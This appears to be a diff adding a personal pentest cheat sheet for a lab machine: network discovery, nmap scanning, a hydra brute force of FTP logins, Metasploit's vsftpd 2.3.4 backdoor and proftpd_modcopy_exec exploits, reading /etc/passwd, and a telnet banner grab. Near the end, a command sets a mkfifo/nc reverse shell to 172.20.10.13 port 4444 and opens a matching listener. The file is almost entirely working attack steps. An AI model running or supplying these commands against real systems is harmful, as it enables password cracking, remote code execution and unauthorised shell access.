@@ -1,0 +1,37 @@
+netdiscover -r <source IP>
+nmap -sV 192.168.36.144 (scan the target matchine)
+hydra -L /root/Desktop/usernames.txt -P /root/Desktop/passwordfile.txt 192.168.36.144 ftp -V (using hydra for finding username and password , working on varvas mode)
+
+***********after finding the username and password********
+
+ftp msfadmin@192.168.36.144 (put ftp server username and password)
+Note: after enter the ftp server, check all the folder and files as well.
+
+************** for Exploitation and backdoor **************
+msfconsole
+msf6> search vsftpd
+msf6> use exploit/unix/ftp/vsftpd_234_backdoor (no need to run any payload , it's automatic)
+msf6> show options 
+msf6> set RHOSTS 192.168.36.144 (set the target host)
+Msf6> exploit (execution the services)
+ after waiting some time we will enter the linux machine (no need any GUI mode)
+ls (to check the list)
+cat /etc/passwd (to check the all users)
+
+msf6> use auxiliary/scanner/telnet/telnet_version ()
+msf6> show options
+msf6> set RHOSTS 192.168.36.144
+msf6> exploit (showing banner, some time in banner sohw username and password)
+telnet 192.168.36.144 (to login through telnet in target device and access that file and folder)
+
+
+gunzip /usr/share/wordlists/rockyou.txt.gz (wordlist from rockyou.txt)
+
+use exploit/unix/ftp/proftpd_modcopy_exec
+set RHOSTS <target hosts IP>
+set SITEPATH /var/www/html
+show payloads
+set payload payload/cmd/unix/generic
+show payloads options
+set CMD rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.20.10.13 4444 >/tmp/f
+nc -lnvp 4444
